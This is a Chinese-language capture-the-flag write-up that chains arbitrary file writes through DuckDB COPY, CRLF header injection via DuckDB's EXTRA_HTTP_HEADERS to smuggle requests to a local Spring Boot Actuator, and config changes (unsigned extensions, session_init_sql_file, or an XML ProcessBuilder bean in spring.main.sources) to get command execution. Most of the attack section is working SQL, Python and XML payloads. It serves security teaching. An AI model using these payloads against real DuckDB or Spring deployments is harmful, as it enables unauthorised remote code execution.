# Writeup

竹外桃花三两枝，春江水暖鸭先知。蒌蒿满地芦芽短，正是河豚欲上时。

## 利用链总览
1) 使用DuckDB进行任意文件写：将恶意扩展文件写入 DuckDB 扩展目录
2) 使用DuckDB进行SSRF：`CREATE SECRET http_auth (TYPE http, EXTRA_HTTP_HEADERS MAP {...})` 在请求头里注入 CRLF，走私出第二条 HTTP 报文
   - `POST /actuator/env` 
     - 修改数据源配置让 DuckDB 允许加载未签名扩展、绕过SET allow_unsigned_extensions=false; 
     - 或：修改 `spring.main.sources`，让Spring加载新的Bean
   - 构造 `POST /actuator/restart` 重启应用
5) 加载恶意扩展，执行命令拿flag

### Step 1：上传恶意扩展

查找扩展列表，发现[shellfs](https://duckdb.org/community_extensions/extensions/shellfs)。由于服务器是断网环境，考虑把这个扩展上传到服务器上以让DuckDB加载。（BTW，都能shell了居然还有签名）

阅读文档，很容易发现DuckDB的[Copy Statement](https://duckdb.org/docs/stable/sql/statements/copy)，可以写文件。这里需要注意使用FORMAT BLOB以让扩展文件保持原样。

上传 `.info` 文件和扩展本体：

```sql
COPY (SELECT from_base64('<base64(shellfs.duckdb_extension.info)>') AS s) TO '~/.duckdb/extensions/v1.4.1/linux_amd64/shellfs.duckdb_extension.info' (FORMAT BLOB);
COPY (SELECT from_base64('<base64(shellfs.duckdb_extension)>') AS s) TO '~/.duckdb/extensions/v1.4.1/linux_amd64/shellfs.duckdb_extension' (FORMAT BLOB);
```

### Step 2：SSRF + CrLf走私修改配置

`application.properties`里明晃晃地写着：
```properties
management.endpoints.web.exposure.include=*
management.endpoint.env.post.enabled=true
management.endpoint.restart.enabled=true
```

很明显，SSRF打127.0.0.1:8081的Spring Actuator，可以通过修改配置+重载的方式实现RCE，现在需要找SSRF的地方。从文档里（和代码里）可以发现[HTTPFS](https://duckdb.org/docs/stable/core_extensions/httpfs/https)。不过调试和阅读代码后很容易发现，`read_csv('http://...')` 只能使用GET方法。整个代码库除了向S3写文件没有地方使用POST/PUT。

不过，阅读文档可以注意到 EXTRA_HTTP_HEADERS 参数。自己Fuzz一下，或者[阅读代码](https://github.com/duckdb/duckdb/blob/44b706b2b79dbc04df8396da698f256acac07dc1/third_party/httplib/httplib.hpp)，很容易发现这个头可以CrLf注入。（使用curl实现似乎可避免此问题，但默认是httplib。）

这里有两种做法。

#### JDBC + DuckDB

因此，可以让 `/actuator/env` 修改数据源URL，允许加载未签名扩展。`;allow_unsigned_extensions=1`可以参见这个[Issue](https://github.com/duckdb/duckdb-java/pull/237)。

另外，在运行我们的SQL之前
```java
jdbcTemplate.execute("SET allow_community_extensions=false;SET allow_unsigned_extensions=false;"); 
```
强制禁止了扩展加载，所以必须在这行代码之前执行SQL。阅读[代码](https://github.com/duckdb/duckdb-java/blob/d00260ed2b7ea865c3146cbfd3935781e1d208d8/src/main/java/org/duckdb/DuckDBDriver.java#L47)可以看到`session_init_sql_file`这个配置，可以在JDBC连接时运行SQL来RCE。

```sql
;把下面这行通过COPY TO写入到 /tmp/session.sql
load shellfs; COPY (SELECT * from read_csv('/readflag |', columns={'a':'blob'})) TO '/tmp/a.txt' (FORMAT BLOB); ; 

CREATE OR REPLACE SECRET http_auth (
  TYPE http,
  EXTRA_HTTP_HEADERS MAP {
    'AAAA': url_decode(
      'x%0d%0aConnection%3a%20keep-alive%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0a%0d%0a'
      'POST%20/actuator/env%20HTTP/1.1%0d%0a'
      'Content-Type%3a%20application/json%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0aContent-Length%3a%2092%0d%0a%0d%0a'
      '{"name":"spring.datasource.url","value":"jdbc:duckdb:/tmp/c.db;allow_unsigned_extensions=1;session_init_sql_file=/tmp/a.sql"}'
      '%0d%0aGET%20/%20HTTP/1.1'
    )
  }
);

SELECT * FROM read_csv('http://127.0.0.1:8081/');
```

#### spring.main.sources

截至目前，互联网上似乎我只搜索到利用[Groovy](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators)修改这个参数的做法。不过Gemini 3告诉了我一种新做法。

阅读以下代码：
- [BeanDefinitionLoader.java#L176](https://github.com/spring-projects/spring-boot/blob/811ddcd1b80cb8691d46fec105e9ea6daeed986a/core/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java#L176) - spring.main.sources除了Groovy以外还支持XML
- [WithSampleBeansXmlResource.java#L35](https://github.com/spring-projects/spring-boot/blob/811ddcd1b80cb8691d46fec105e9ea6daeed986a/core/spring-boot/src/test/java/org/springframework/boot/WithSampleBeansXmlResource.java#L35) - XML例子

可以发现spring.main.sources神奇地支持通过XML写一个bean，因此做法就呼之欲出了。

```python
    xml_payload = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>/readflag &gt; /tmp/a.txt</value>
            </list>
        </constructor-arg>
    </bean>
</beans>"""
    write_file("/tmp/pwn.xml", xml_payload)
    # spring.main.sources=/tmp/pwn.xml
```

### Step 3：重启应用

同样使用 CRLF 走私重启应用：

```sql
CREATE OR REPLACE SECRET http_auth (
  TYPE http,
  EXTRA_HTTP_HEADERS MAP {
    'AAAA': url_decode(
      'x%0d%0aConnection%3a%20keep-alive%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0a%0d%0a'
      'POST%20/actuator/restart%20HTTP/1.1%0d%0a'
      'Content-Type%3a%20application/json%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0aContent-Length%3a%202%0d%0a%0d%0a'
      '{}'
      '%0d%0aGET%20/%20HTTP/1.1'
    )
  }
);

SELECT * FROM read_csv('http://127.0.0.1:8081/');
```

### Step 4：拿flag

等待应用重启完成后，get flag

```json
{"sql": "select * from read_csv('/tmp/a.txt',header = false);"}
```
